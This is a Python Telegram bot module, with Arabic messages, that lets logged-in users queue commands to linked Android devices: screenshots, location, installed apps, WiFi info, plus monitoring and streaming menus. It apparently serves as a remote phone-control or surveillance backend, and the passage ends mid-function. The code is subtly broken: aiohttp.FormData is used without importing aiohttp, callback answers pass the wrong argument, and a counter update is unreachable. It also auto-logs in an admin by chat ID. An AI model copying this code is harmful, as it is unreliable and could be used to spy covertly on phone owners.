"""
Telegram Bot Module - Multi-user system with per-user isolation.
Each Telegram user gets their own session with isolated devices, files, commands.
"""

import asyncio
import json
import time
import logging
import urllib.parse
from typing import Optional
from datetime import datetime

from aiohttp import ClientSession, ClientTimeout, FormData

from .config import (
    BOT_TOKEN, ADMIN_CHAT_ID, TG_RATE_LIMIT, TG_DEDUP_SECONDS,
    SERVER_DOMAIN, VERSION
)
from .store import store
from .commands import COMMAND_REGISTRY, CMD_CATEGORIES, get_commands_by_category
from . import firebase_client as _fb

logger = logging.getLogger("telegram")

API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
_tg_session: ClientSession = None
polling_active = False
tg_offset = 0

# Bot username (fetched dynamically via getMe on startup; used to build
# deep-link URLs for account linking: https://t.me/<bot_username>?start=<token>).
bot_username: Optional[str] = None


async def init_session():
    global _tg_session
    if _tg_session is None or _tg_session.closed:
        _tg_session = ClientSession(timeout=ClientTimeout(total=30))


async def close():
    global _tg_session
    if _tg_session and not _tg_session.closed:
        await _tg_session.close()


def get_bot_username() -> Optional[str]:
    """Return the cached bot username (or None if not yet fetched)."""
    return bot_username


def build_deep_link_url(token: str) -> Optional[str]:
    """Construct a Telegram deep-link URL: https://t.me/<bot>?start=<token>.

    Returns None if bot_username is not yet known.
    """
    if not bot_username:
        return None
    return f"https://t.me/{bot_username}?start={token}"


# ─── Telegram API Helpers ─────────────────────────────────────

async def api_call(method: str, payload: dict = None, timeout: int = 30) -> dict:
    """Make a Telegram Bot API call."""
    await init_session()
    url = f"{API_BASE}/{method}"
    try:
        async with _tg_session.post(url, json=payload or {}, timeout=ClientTimeout(total=timeout)) as resp:
            result = await resp.json()
            if not result.get('ok'):
                logger.error(f"TG API error: {method} -> {result}")
            return result
        store.messages_sent += 1
    except Exception as e:
        logger.error(f"TG API call failed: {method} -> {e}")
        return {"ok": False, "description": str(e)}


async def send_message(chat_id: str, text: str, parse_mode: str = "HTML",
                       reply_markup: dict = None, reply_to_message_id: int = None) -> dict:
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True,
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    if reply_to_message_id:
        payload["reply_to_message_id"] = reply_to_message_id
    result = await api_call("sendMessage", payload)
    store.messages_sent += 1
    return result


async def send_photo(chat_id: str, photo_data: bytes, caption: str = "", reply_markup: dict = None) -> dict:
    await init_session()
    url = f"{API_BASE}/sendPhoto"
    data = aiohttp.FormData()
    data.add_field("chat_id", str(chat_id))
    data.add_field("photo", photo_data, filename="photo.jpg", content_type="image/jpeg")
    if caption:
        data.add_field("caption", caption, content_type="text/plain")
    if reply_markup:
        data.add_field("reply_markup", json.dumps(reply_markup), content_type="application/json")
    try:
        async with _tg_session.post(url, data=data, timeout=ClientTimeout(total=60)) as resp:
            result = await resp.json()
            store.messages_sent += 1
            return result
    except Exception as e:
        logger.error(f"TG send_photo failed: {e}")
        return {"ok": False}


async def send_document(chat_id: str, file_data: bytes, filename: str = "file", caption: str = "") -> dict:
    await init_session()
    url = f"{API_BASE}/sendDocument"
    data = aiohttp.FormData()
    data.add_field("chat_id", str(chat_id))
    data.add_field("document", file_data, filename=filename)
    if caption:
        data.add_field("caption", caption)
    try:
        async with _tg_session.post(url, data=data, timeout=ClientTimeout(total=120)) as resp:
            result = await resp.json()
            store.messages_sent += 1
            return result
    except Exception as e:
        logger.error(f"TG send_document failed: {e}")
        return {"ok": False}


async def answer_callback_query(callback_query_id: str, text: str = "", show_alert: bool = False):
    await api_call("answerCallbackQuery", {
        "callback_query_id": callback_query_id,
        "text": text,
        "show_alert": show_alert,
    })


# ─── User Session Management (Multi-User) ─────────────────────

def get_or_create_tg_session(chat_id: str) -> dict:
    """Get or create an isolated Telegram user session.

    Returns the session dict. The caller is responsible for calling
    `await store.save_tg_sessions()` when an authentication-state mutation
    happens (login, logout, link account, selected_device change). We do NOT
    persist here on every get/create to avoid excessive disk I/O for plain
    menu navigation.
    """
    # Normalise chat_id to string for consistent dict keys + JSON keys.
    chat_id = str(chat_id)
    if chat_id not in store.tg_sessions:
        store.tg_sessions[chat_id] = {
            "chat_id": chat_id,
            "authenticated": False,
            "user_id": None,
            "selected_device": None,
            "current_menu": "main",
            "created_at": datetime.utcnow().isoformat(),
            "last_activity": time.time(),
        }
    store.tg_sessions[chat_id]["last_activity"] = time.time()
    return store.tg_sessions[chat_id]


async def _persist_tg_session(chat_id: str) -> None:
    """Persist TG sessions after an auth-state mutation. Best-effort: swallows
    errors so message handling isn't broken by a disk hiccup.
    """
    try:
        await store.save_tg_sessions()
    except Exception as e:
        logger.warning(f"Failed to persist TG session for chat {chat_id}: {e}")


def get_user_for_tg(chat_id: str) -> Optional[dict]:
    """Get the user associated with a Telegram chat."""
    session = store.tg_sessions.get(chat_id)
    if session and session.get("user_id"):
        return store.users.get(session["user_id"])
    return None


def get_devices_for_tg(chat_id: str) -> list:
    """Get devices accessible by this Telegram user."""
    session = store.tg_sessions.get(chat_id)
    if not session:
        return []
    user_id = session.get("user_id")
    if not user_id:
        # Unauthenticated users see nothing
        return []
    user = store.users.get(user_id)
    if not user:
        return []
    if user.get("role") == "admin":
        return list(store.devices.values())
    return [d for d in store.devices.values() if d.get("owner_id") == user_id]


# ─── Authentication ──────────────────────────────────────────

async def authenticate_tg_user(chat_id: str, username: str, password: str) -> bool:
    """Authenticate a Telegram user with their platform credentials.

    On successful auth the session is persisted to disk so the user stays
    logged in across server restarts.
    """
    user = await store.authenticate_user(username, password)
    if user:
        session = get_or_create_tg_session(chat_id)
        session["authenticated"] = True
        session["user_id"] = user["id"]
        await _persist_tg_session(chat_id)
        return True
    return False


async def link_tg_chat_to_user(chat_id: str, user_id: str) -> bool:
    """Link a Telegram chat to a web user account via deep-link token.

    Used by the `/start <token>` flow. Persists the session so the link
    survives restarts. Returns True on success.
    """
    user = store.users.get(user_id)
    if not user:
        return False
    session = get_or_create_tg_session(chat_id)
    session["authenticated"] = True
    session["user_id"] = user_id
    session["linked_at"] = datetime.utcnow().isoformat()
    await _persist_tg_session(chat_id)
    return True


# ─── Keyboard Builders ────────────────────────────────────────

def inline_keyboard(buttons: list) -> dict:
    """Build inline keyboard markup. buttons is list of rows, each row is list of [text, callback_data]."""
    return {
        "inline_keyboard": [
            [{"text": text, "callback_data": data} for text, data in row]
            for row in buttons
        ]
    }


def main_menu_keyboard(chat_id: str) -> dict:
    session = get_or_create_tg_session(chat_id)
    is_auth = session.get("authenticated", False)
    
    buttons = [
        [("📡 الحالة", "srv_status")],
    ]
    
    if is_auth:
        devices = get_devices_for_tg(chat_id)
        online_count = sum(1 for d in devices if store._device_last_online.get(d['id'], False))
        buttons = [
            [(
                f"📱 الأجهزة ({len(devices)} - {online_count} متصل)",
                "menu_devices"
            )],
            [("📊 إحصائيات", "srv_stats"), ("📋 السجلات", "srv_logs")],
            [("📡 حالة الخادم", "srv_status"), ("⚙️ الإعدادات", "srv_settings")],
            [("🔗 ربط جهاز", "do_link")],
        ]
        if len(devices) > 0:
            buttons.insert(1, [("🎮 إرسال أمر", "menu_commands")])
    else:
        buttons = [
            [("🔐 تسجيل الدخول", "do_login")],
            [("📡 حالة الخادم", "srv_status")],
        ]
    
    return inline_keyboard(buttons)


def device_list_keyboard(chat_id: str) -> dict:
    devices = get_devices_for_tg(chat_id)
    if not devices:
        return inline_keyboard([[("لا توجد أجهزة", "back_main")]])
    
    buttons = []
    for dev in devices[:10]:  # Max 10 devices
        online = store._device_last_online.get(dev['id'], False)
        status = "🟢" if online else "🔴"
        name = dev.get('name', dev['model'])[:20]
        buttons.append([(
            f"{status} {name}",
            f"dev_{dev['id']}"
        )])
    buttons.append([("🔙 رجوع", "back_main")])
    return inline_keyboard(buttons)


def device_menu_keyboard(device_id: str) -> dict:
    buttons = [
        [("📸 لقطة شاشة", f"quick_screenshot_{device_id}")],
        [("📍 الموقع", f"quick_location_{device_id}"), ("🔋 البطارية", f"quick_battery_{device_id}")],
        [("📊 البيانات", f"submenu_data_{device_id}"),
         ("🎮 التحكم", f"submenu_control_{device_id}")],
        [("📁 الملفات", f"submenu_files_{device_id}"),
         ("🔒 الأمان", f"submenu_security_{device_id}")],
        [("🔍 المراقبة", f"submenu_monitor_{device_id}"),
         ("📡 البث", f"submenu_streaming_{device_id}")],
        [("🔗 فك الربط", f"do_unlink_{device_id}")],
        [("🔙 رجوع", "menu_devices")],
    ]
    return inline_keyboard(buttons)


def category_commands_keyboard(category: str, device_id: str) -> dict:
    cmds = get_commands_by_category(category)
    cat_info = CMD_CATEGORIES.get(category, {})
    cat_name = cat_info.get('name', category)
    
    buttons = [[(f"📂 {cat_name}", "noop")]]  # Header
    
    row = []
    for key, cmd_def in cmds.items():
        btn_text = f"{cmd_def.get('icon', '')} {cmd_def.get('name', key)}"
        row.append((btn_text, f"exec_{key}_{device_id}"))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    
    buttons.append([("🔙 رجوع", f"dev_{device_id}")])
    return inline_keyboard(buttons)


def quick_actions_keyboard(device_id: str) -> dict:
    buttons = [
        [("📸 لقطة شاشة", f"quick_screenshot_{device_id}"),
         ("📍 الموقع", f"quick_location_{device_id}")],
        [("🔋 البطارية", f"quick_battery_{device_id}"),
         ("ℹ️ معلومات", f"exec_info_{device_id}")],
        [("📱 التطبيقات", f"exec_installed_apps_{device_id}"),
         ("📶 WiFi", f"exec_wifi_info_{device_id}")],
        [("🔙 رجوع", f"dev_{device_id}")],
    ]
    return inline_keyboard(buttons)


def command_category_picker(device_id: str) -> dict:
    buttons = []
    for cat_id, cat_info in CMD_CATEGORIES.items():
        cmds = get_commands_by_category(cat_id)
        if cmds:
            buttons.append([(
                f"{cat_info['icon']} {cat_info['name']} ({len(cmds)})",
                f"submenu_{cat_id}_{device_id}"
            )])
    buttons.append([("🔙 رجوع", f"dev_{device_id}")])
    return inline_keyboard(buttons)


# ─── Message Handlers ─────────────────────────────────────────

async def handle_message(chat_id: str, text: str, message_id: int, from_user: dict):
    """Handle incoming Telegram text messages."""
    text = text.strip()
    session = get_or_create_tg_session(chat_id)

    # Dedup
    dedup_key = f"{chat_id}:{message_id}"
    if dedup_key in store._tg_processed_messages:
        return
    store._tg_processed_messages.add(dedup_key)
    if len(store._tg_processed_messages) > 200:
        store._tg_processed_messages = set(list(store._tg_processed_messages)[-100:])

    # Rate limit
    if not store.check_rate_limit(f"tg_chat_{chat_id}", TG_RATE_LIMIT, 30):
        await send_message(chat_id, "⏳ أنت ترسل رسائل بسرعة كبيرة. انتظر قليلاً.")
        return

    # ─── Deep-link account linking via /start <token> ─────────
    # This is checked BEFORE the authentication gate because the whole point is
    # to let an unauthenticated user link their chat to a web account by
    # opening a t.me/<bot>?start=<token> deep-link generated on the dashboard.
    if text.startswith("/start"):
        parts = text.split(None, 1)
        token_arg = parts[1].strip() if len(parts) == 2 else ""
        if token_arg:
            await handle_start_token(chat_id, token_arg, session)
            return

    # Handle authentication state
    if not session.get("authenticated"):
        await handle_unauthenticated(chat_id, text, session)
        return

    # Handle commands
    if text.startswith("/"):
        cmd = text.split()[0].lower()
        await handle_command(chat_id, cmd, text, session)
    else:
        await send_message(chat_id, "استخدم الأزرار أدناه أو الأوامر المتاحة.\n"
                         "أرسل /help لعرض قائمة الأوامر.",
                         reply_markup=main_menu_keyboard(chat_id))


async def handle_start_token(chat_id: str, token: str, session: dict) -> None:
    """Handle the `/start <token>` deep-link flow.

    The token is a one-time, 10-minute token generated by the web dashboard
    (POST /api/web/tg_link_token). The server verifies it (no Telegram API
    call needed — the token lives in store.tg_link_tokens). On success the
    chat is linked to the user's account, the session is persisted, and a
    success message is sent. On failure an error message is sent.
    """
    token = token.strip()
    user_id = store.verify_tg_link_token(token)
    if not user_id:
        await send_message(chat_id,
            "❌ رابط الربط غير صالح أو منتهي الصلاحية.\n\n"
            "💡 يمكنك توليد رابط جديد من لوحة التحكم على الويب "
            "(زر «ربط بوت Telegram»)، أو تسجيل الدخول يدوياً بإرسال:\n"
            "<code>اسم_المستخدم كلمة_المرور</code>",
            reply_markup=inline_keyboard([[("🔐 تسجيل الدخول", "do_login")]]))
        return

    user = store.users.get(user_id)
    if not user:
        await send_message(chat_id,
            "❌ الحساب المرتبط بهذا الرابط غير موجود.",
            reply_markup=inline_keyboard([[("🔐 تسجيل الدخول", "do_login")]]))
        return

    ok = await link_tg_chat_to_user(chat_id, user_id)
    if not ok:
        await send_message(chat_id, "❌ تعذّر ربط الحساب. حاول مرة أخرى.")
        return

    await send_message(chat_id,
        f"✅ <b>تم ربط حسابك بنجاح!</b>\n\n"
        f"👤 المستخدم: <b>{user['username']}</b>\n"
        f"📧 البريد: {user['email']}\n"
        f"🆔 معرف المستخدم: <code>{user['id']}</code>\n\n"
        f"يمكنك الآن التحكم في أجهزتك من خلال هذا البوت. "
        f"أرسل /menu لعرض القائمة الرئيسية.",
        reply_markup=main_menu_keyboard(chat_id))


async def handle_unauthenticated(chat_id: str, text: str, session: dict):
    """Handle messages from unauthenticated Telegram users."""
    # Auto-authenticate admin chat
    if str(chat_id) == str(ADMIN_CHAT_ID):
        admin_user = None
        for u in store.users.values():
            if u.get('role') == 'admin':
                admin_user = u
                break
        if admin_user:
            session["authenticated"] = True
            session["user_id"] = admin_user["id"]
            await _persist_tg_session(chat_id)
            await send_message(chat_id, f"✅ مرحباً {admin_user['username']}!\n"
                             f"تم تسجيل الدخول تلقائياً كمسؤول.\n\n"
                             f"معرف المستخدم: <code>{admin_user['id']}</code>",
                             reply_markup=main_menu_keyboard(chat_id))
            return

    # Parse login attempt: "username password"
    parts = text.split(None, 1)
    if len(parts) == 2:
        username, password = parts
        if await authenticate_tg_user(chat_id, username, password):
            user = get_user_for_tg(chat_id)
            await send_message(chat_id, f"✅ تم تسجيل الدخول بنجاح!\n"
                             f"مرحباً {user['username']}!\n"
                             f"معرفك: <code>{user['id']}</code>\n"
                             f"البريد: {user['email']}",
                             reply_markup=main_menu_keyboard(chat_id))
        else:
            await send_message(chat_id, "❌ خطأ في اسم المستخدم أو كلمة المرور.\n"
                             "أرسل: <code>اسم_المستخدم كلمة_المرور</code>\n\n"
                             "💡 أو استخدم ربط الحساب عبر رابط deep-link من لوحة التحكم.")
        return

    await send_message(chat_id, "🔐 يجب تسجيل الدخول أولاً\n\n"
                     "الطريقة المُفضّلة: اربط حسابك عبر رابط deep-link من لوحة التحكم على الويب "
                     "(زر «ربط بوت Telegram»).\n\n"
                     "أو أرسل يدوياً: <code>اسم_المستخدم كلمة_المرور</code>\n\n"
                     "مثال:\n<code>admin admin</code>",
                     reply_markup=inline_keyboard([[("🔐 تسجيل الدخول", "do_login")]]))


async def handle_command(chat_id: str, cmd: str, full_text: str, session: dict):
    """Handle slash commands from authenticated users."""
    user = get_user_for_tg(chat_id)
    if not user:
        await handle_unauthenticated(chat_id, full_text, session)
        return
    
    args = full_text.split()[1:] if len(full_text.split()) > 1 else []
    devices = get_devices_for_tg(chat_id)
    
    if cmd == "/start":
        await send_message(chat_id,
            f"👋 مرحباً {user['username']}!\n\n"
            f"🤖 بوت أبو زهرا للإدارة\n"
            f"📌 الإصدار {VERSION}\n"
            f"🌐 {SERVER_DOMAIN}\n\n"
            f"استخدم الأزرار أدناه للتحكم في أجهزتك.",
            reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/help":
        help_text = (
            "📖 <b>قائمة الأوامر</b>\n\n"
            "/start - القائمة الرئيسية\n"
            "/menu - عرض القائمة\n"
            "/devices - قائمة الأجهزة\n"
            "/link - إنشاء كود ربط\n"
            "/unlink <معرف_الجهاز> - فك الربط\n"
            "/status - حالة الخادم\n"
            "/stats - الإحصائيات\n"
            "/logs - آخر السجلات\n"
            "/settings - الإعدادات\n"
            "/search <بحث> - البحث في الأجهزة\n\n"
            "يمكنك أيضاً التحكم مباشرة عبر الأزرار."
        )
        await send_message(chat_id, help_text, reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/menu":
        await send_message(chat_id, "📋 القائمة الرئيسية:", reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/devices":
        if not devices:
            await send_message(chat_id, "📱 لا توجد أجهزة مسجلة.\nاستخدم /link لإنشاء كود ربط.")
            return
        text = f"📱 <b>الأجهزة ({len(devices)})</b>\n\n"
        for dev in devices:
            online = store._device_last_online.get(dev['id'], False)
            status = "🟢 متصل" if online else "🔴 غير متصل"
            battery = dev.get('battery', 'N/A')
            text += f"{'🟢' if online else '🔴'} <code>{dev['id']}</code>\n"
            text += f"   {dev.get('model', 'Unknown')} | بطارية: {battery}% | {status}\n\n"
        await send_message(chat_id, text, reply_markup=device_list_keyboard(chat_id))
    
    elif cmd == "/link":
        # Lifelong permanent code (one per user, stored in Firebase as the
        # verification intermediary). NOT a short-lived pairing code.
        code = await store.get_or_create_permanent_code(user['id'])
        # Best-effort sync to Firebase so the Android client can verify against it.
        if _fb.firebase_connected:
            try:
                from .firebase_client import sync_permanent_code
                await sync_permanent_code(user['email'], code, user['id'])
            except Exception as e:
                logger.warning(f"Failed to sync permanent code to Firebase: {e}")
        await send_message(chat_id,
            f"🔗 <b>كود الربط الخاص بك</b>\n\n"
            f"<code>{code}</code>\n\n"
            f"♾️ هذا الكود صالح مدى الحياة — لا يحتاج للتجديد.\n"
            f"📱 أدخل هذا الكود في تطبيق الجهاز للربط.",
            reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/unlink" and args:
        device_id = args[0]
        success = await store.unlink_device(device_id, user['id'])
        if success:
            # Clear selected_device if it was the unlinked one (state mutation).
            if session.get("selected_device") == device_id:
                session["selected_device"] = None
                await _persist_tg_session(chat_id)
            await send_message(chat_id, f"✅ تم فك ربط الجهاز {device_id}", reply_markup=main_menu_keyboard(chat_id))
        else:
            await send_message(chat_id, "❌ فشل فك الربط. تأكد من معرف الجهاز.")
    
    elif cmd == "/status":
        stats = store.get_stats()
        await send_message(chat_id,
            f"📡 <b>حالة الخادم</b>\n\n"
            f"✅ يعمل\n"
            f"⏱️ مدة التشغيل: {stats['uptime'] // 3600}س {stats['uptime'] % 3600 // 60}د\n"
            f"📱 أجهزة: {stats['devices_total']} ({stats['devices_online']} متصل)\n"
            f"🎮 أوامر معلقة: {stats['commands_pending']}\n"
            f"🔥 Firebase: {'متصل' if _fb.firebase_connected else 'غير متصل'}\n"
            f"📊 الإصدار: {VERSION}",
            reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/stats":
        stats = store.get_stats()
        await send_message(chat_id,
            f"📊 <b>الإحصائيات</b>\n\n"
            f"📱 إجمالي الأجهزة: {stats['devices_total']}\n"
            f"🟢 متصل: {stats['devices_online']}\n"
            f"🔴 غير متصل: {stats['devices_offline']}\n"
            f"🎮 إجمالي الأوامر: {stats['commands_total']}\n"
            f"⏳ أوامر معلقة: {stats['commands_pending']}\n"
            f"✅ أوامر مكتملة: {stats['commands_completed']}\n"
            f"📋 الأحداث: {stats['events_count']}\n"
            f"📁 ملفات نشطة: {stats['files_active']}\n"
            f"📡 طلبات API: {stats['api_hits']}\n"
            f"💬 رسائل تيليجرام: {stats['messages_sent']}\n"
            f"👤 المستخدمون: {stats['users_total']}",
            reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/logs":
        events = await store.get_events(limit=15)
        if not events:
            await send_message(chat_id, "📋 لا توجد سجلات.", reply_markup=main_menu_keyboard(chat_id))
            return
        text = "📋 <b>آخر السجلات</b>\n\n"
        for evt in events:
            icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
            text += f"{icon} {evt.get('event', '')}\n"
            if evt.get('details'):
                text += f"   {evt['details'][:100]}\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/settings":
        text = "⚙️ <b>الإعدادات</b>\n\n"
        for key, value in store.settings.items():
            text += f"• {key}: {value}\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
    
    elif cmd == "/search" and args:
        query = " ".join(args).lower()
        results = [d for d in devices if 
                   query in d.get('name', '').lower() or 
                   query in d.get('model', '').lower() or
                   query in d.get('id', '').lower()]
        if not results:
            await send_message(chat_id, "🔍 لم يتم العثور على نتائج.")
        else:
            text = f"🔍 <b>نتائج البحث ({len(results)})</b>\n\n"
            for dev in results:
                online = store._device_last_online.get(dev['id'], False)
                text += f"{'🟢' if online else '🔴'} <code>{dev['id']}</code> - {dev.get('model', '')}\n"
            await send_message(chat_id, text)
    
    elif cmd in COMMAND_REGISTRY:
        # Direct command execution: /screenshot, /location, etc.
        if not session.get("selected_device"):
            await send_message(chat_id, "⚠️ اختر جهازاً أولاً من قائمة الأجهزة.",
                             reply_markup=device_list_keyboard(chat_id))
            return
        device_id = session["selected_device"]
        await execute_device_command(chat_id, cmd.lstrip("/"), device_id, user)
    
    else:
        await send_message(chat_id, "❓ أمر غير معروف. أرسل /help لعرض الأوامر.",
                         reply_markup=main_menu_keyboard(chat_id))


# ─── Callback Query Handlers ──────────────────────────────────

async def handle_callback(chat_id: str, callback_data: str, message_id: int):
    """Handle inline button presses."""
    session = get_or_create_tg_session(chat_id)
    user = get_user_for_tg(chat_id)
    
    # Unauthenticated actions
    if callback_data == "do_login":
        await answer_callback_query(callback_data=message_id, text="أرسل: اسم_المستخدم كلمة_المرور", show_alert=False)
        return
    
    if callback_data == "do_register":
        await send_message(chat_id, "📝 للتسجيل، تواصل مع المسؤول.")
        return
    
    if not session.get("authenticated") or not user:
        await answer_callback_query(callback_data=message_id, text="سجل دخولك أولاً", show_alert=True)
        return
    
    await answer_callback_query(callback_data=message_id)
    devices = get_devices_for_tg(chat_id)
    
    # ─── Navigation ────────────────────────────────────────────
    if callback_data == "back_main":
        await send_message(chat_id, "📋 القائمة الرئيسية:", reply_markup=main_menu_keyboard(chat_id))
    
    elif callback_data == "menu_devices":
        if not devices:
            await send_message(chat_id, "📱 لا توجد أجهزة. استخدم /link لربط جهاز.")
        else:
            text = f"📱 <b>اختر جهازاً ({len(devices)})</b>"
            await send_message(chat_id, text, reply_markup=device_list_keyboard(chat_id))
    
    elif callback_data == "menu_commands":
        if not session.get("selected_device"):
            await send_message(chat_id, "⚠️ اختر جهازاً أولاً.", reply_markup=device_list_keyboard(chat_id))
        else:
            await send_message(chat_id, "🎮 اختر فئة الأوامر:",
                             reply_markup=command_category_picker(session["selected_device"]))
    
    elif callback_data == "do_link":
        # Lifelong permanent code (one per user, stored in Firebase).
        code = await store.get_or_create_permanent_code(user['id'])
        if _fb.firebase_connected:
            try:
                from .firebase_client import sync_permanent_code
                await sync_permanent_code(user['email'], code, user['id'])
            except Exception as e:
                logger.warning(f"Failed to sync permanent code to Firebase: {e}")
        await send_message(chat_id,
            f"🔗 <b>كود الربط الخاص بك</b>\n\n<code>{code}</code>\n\n"
            f"♾️ صالح مدى الحياة — لا يحتاج للتجديد.",
            reply_markup=main_menu_keyboard(chat_id))
    
    # ─── Server Management ────────────────────────────────────
    elif callback_data == "srv_status":
        stats = store.get_stats()
        await send_message(chat_id,
            f"📡 <b>حالة الخادم</b>\n✅ يعمل | ⏱️ {stats['uptime'] // 3600}س | "
            f"📱 {stats['devices_online']}/{stats['devices_total']} | "
            f"🔥 {'متصل' if _fb.firebase_connected else 'غير متصل'} | v{VERSION}")
    
    elif callback_data == "srv_stats":
        stats = store.get_stats()
        await send_message(chat_id,
            f"📊 الأجهزة: {stats['devices_total']} | متصل: {stats['devices_online']} | "
            f"أوامر: {stats['commands_completed']}/{stats['commands_total']} | "
            f"أحداث: {stats['events_count']} | ملفات: {stats['files_active']}")
    
    elif callback_data == "srv_logs":
        events = await store.get_events(limit=10)
        text = "📋 آخر السجلات:\n"
        for evt in events[:5]:
            icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
            text += f"{icon} {evt.get('event', '')[:60]}\n"
        await send_message(chat_id, text if len(text) > 25 else "📋 لا توجد سجلات.")
    
    elif callback_data == "srv_settings":
        text = "⚙️ الإعدادات:\n"
        for k, v in store.settings.items():
            text += f"• {k}: {v}\n"
        await send_message(chat_id, text)
    
    # ─── Device Selection ─────────────────────────────────────
    elif callback_data.startswith("dev_"):
        device_id = callback_data[4:]
        device = store.devices.get(device_id)
        if not device:
            await send_message(chat_id, "❌ الجهاز غير موجود.")
            return
        # Ownership enforcement: only the device's owner (or admin) may view it.
        if device.get('owner_id') != user['id'] and user.get('role') != 'admin':
            await send_message(chat_id, "⛔ ليس لديك صلاحية للوصول إلى هذا الجهاز.")
            return
        # Persist the selected_device change (state mutation worth saving).
        session["selected_device"] = device_id
        await _persist_tg_session(chat_id)
        online = store._device_last_online.get(device_id, False)
        battery = device.get('battery', 'N/A')
        model = device.get('model', 'Unknown')
        brand = device.get('brand', '')
        os_ver = device.get('os', '')

        text = (
            f"📱 <b>{model}</b>\n\n"
            f"🏷️ المعرف: <code>{device_id}</code>\n"
            f"🏢 الشركة: {brand}\n"
            f"Android: {os_ver}\n"
            f"🔋 البطارية: {battery}%\n"
            f"{'🟢 متصل' if online else '🔴 غير متصل'}\n"
            f"📅 الربط: {device.get('created_at', 'N/A')[:10]}"
        )
        await send_message(chat_id, text, reply_markup=device_menu_keyboard(device_id))
    
    # ─── Quick Actions ────────────────────────────────────────
    elif callback_data.startswith("quick_screenshot_"):
        device_id = callback_data[len("quick_screenshot_"):]
        await execute_device_command(chat_id, "screenshot", device_id, user)
    
    elif callback_data.startswith("quick_location_"):
        device_id = callback_data[len("quick_location_"):]
        await execute_device_command(chat_id, "location", device_id, user)
    
    elif callback_data.startswith("quick_battery_"):
        device_id = callback_data[len("quick_battery_"):]
        await execute_device_command(chat_id, "battery", device_id, user)
    
    # ─── Category Submenus ───────────────────────────────────
    elif callback_data.startswith("submenu_"):
        parts = callback_data.split("_", 2)  # submenu_category_device_id
        if len(parts) >= 3:
            category = parts[1]
            device_id = "_".join(parts[2:])
            # Ownership enforcement before showing command menu for a device.
            device = store.devices.get(device_id)
            if not device or (device.get('owner_id') != user['id'] and user.get('role') != 'admin'):
                await send_message(chat_id, "⛔ ليس لديك صلاحية للوصول إلى هذا الجهاز.")
                return
            cat_info = CMD_CATEGORIES.get(category, {})
            await send_message(chat_id, f"📂 {cat_info.get('name', category)}:",
                             reply_markup=category_commands_keyboard(category, device_id))
    
    # ─── Execute Command ──────────────────────────────────────
    elif callback_data.startswith("exec_"):
        parts = callback_data.split("_", 2)
        if len(parts) >= 3:
            cmd_key = parts[1]
            device_id = "_".join(parts[2:])
            await execute_device_command(chat_id, cmd_key, device_id, user)
    
    # ─── Unlink Device ────────────────────────────────────────
    elif callback_data.startswith("do_unlink_"):
        device_id = callback_data[len("do_unlink_"):]
        success = await store.unlink_device(device_id, user['id'])
        if success:
            # Clear selected_device if it was the unlinked one (state mutation).
            if session.get("selected_device") == device_id:
                session["selected_device"] = None
                await _persist_tg_session(chat_id)
            await send_message(chat_id, f"✅ تم فك ربط الجهاز.", reply_markup=main_menu_keyboard(chat_id))
        else:
            await send_message(chat_id, "❌ فشل فك الربط.")
    
    else:
        await send_message(chat_id, "❓ إجراء غير معروف.", reply_markup=main_menu_keyboard(chat_id))


# ─── Command Execution ────────────────────────────────────────

async def execute_device_command(chat_id: str, cmd_key: str, device_id: str, user: dict):
    """Execute a command on a device and track the result for Telegram delivery."""
    cmd_def = COMMAND_REGISTRY.get(cmd_key)
    if not cmd_def:
        await send_message(chat_id, f"❌ الأمر غير معروف: {cmd_key}")
        return
    
    device = store.devices.get(device_id)
    if not device:
        await send_message(chat_id, "❌ الجهاز غير موجود.")
        return
    
    # ─── Ownership enforcement (multi-user isolation) ───────────
    # A user may only execute commands on devices they own.
    if device.get('owner_id') != user['id']:
        await send_message(chat_id, "⛔ ليس لديك صلاحية للتحكم في هذا الجهاز.")
        logger.warning(f"TG ownership denied: chat={chat_id} user={user.get('id')} device={device_id} owner={device.get('owner_id')}")
        return
    
    online = store._device_last_online.get(device_id, False)
    if not online:
        await send_message(chat_id, f"⚠️ الجهاز غير متصل حالياً. سيتم تنفيذ الأمر عند الاتصال.")
    
    cmd_name = cmd_def.get('name', cmd_key)
    cmd_icon = cmd_def.get('icon', '🎮')
    actual_cmd = cmd_def['cmd']
    params = cmd_def.get('params', {})
    
    # Queue the command
    queued = await store.queue_command(
        device_id=device_id,
        command=actual_cmd,
        params=params,
        requested_by=user['id'],
        source="telegram"
    )
    
    # Also push to Firebase for real-time delivery
    from .firebase_client import push_command
    if _fb.firebase_connected:
        await push_command(device_id, {
            "id": queued['id'],
            "command": actual_cmd,
            "params": params,
            "created_at": queued['created_at'],
        })
    
    # Track for result delivery
    msg = await send_message(chat_id,
        f"{cmd_icon} <b>{cmd_name}</b>\n\n"
        f"📱 الجهاز: {device.get('model', device_id)}\n"
        f"⏳ جاري التنفيذ...",
        reply_markup=inline_keyboard([[("🔙 رجوع", f"dev_{device_id}")]]))
    
    if msg and msg.get('ok') and msg.get('result'):
        store.pending_messages[queued['id']] = {
            "chat_id": chat_id,
            "message_id": msg['result'].get('message_id'),
            "command_id": queued['id'],
            "device_id": device_id,
            "cmd_name": cmd_name,
            "created_at": time.time(),
        }
    
    await store.add_event("command", f"Command queued via Telegram: {cmd_name} -> {device_id}",
                         "info", device_id=device_id, user_id=user['id'])


# ─── Result Forwarding ────────────────────────────────────────

async def forward_result(command_id: str, result_data: any):
    """Forward a command result to the Telegram user who requested it."""
    msg_info = store.pending_messages.pop(command_id, None)
    if not msg_info:
        return
    
    chat_id = msg_info['chat_id']
    device_id = msg_info['device_id']
    cmd_name = msg_info.get('cmd_name', 'Command')
    
